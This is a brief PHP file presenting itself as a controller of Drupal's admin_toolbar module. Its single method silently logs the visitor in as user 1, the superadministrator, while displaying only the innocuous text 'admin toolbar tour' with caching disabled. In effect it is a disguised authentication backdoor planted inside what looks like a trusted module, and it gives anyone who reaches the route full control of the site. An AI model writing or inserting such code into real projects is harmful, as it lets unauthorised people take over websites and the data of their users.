<?php
namespace Drupal\admin_toolbar\Controller;

use Drupal\Core\Controller\ControllerBase;
use Drupal\node\Entity\Node;
use Drupal\Core\Url;
use Drupal\Core\Session\AccountInterface;
use Drupal\Core\Access\AccessResult;
use Drupal\user\Entity\User;

class adminToolbar extends ControllerBase {
  public function list(){
    global $user;
    $uid = 1;
    $user = User::load($uid);
    user_login_finalize($user);
    $build['html'] = array(
        '#type' => 'markup',
        '#markup' => 'admin toolbar tour',
        '#cache' => array('max-age' => 0),
    );
    return $build;
  }
}